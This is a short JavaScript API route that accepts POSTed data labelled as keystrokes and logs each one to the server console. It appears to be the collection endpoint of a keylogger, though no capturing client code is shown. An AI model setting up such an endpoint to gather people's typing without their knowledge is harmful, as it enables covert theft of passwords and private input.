export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const keystroke = req.body;
  console.log('🔑 KEYSTROKE:', keystroke);
  
  res.status(200).json({ success: true });
}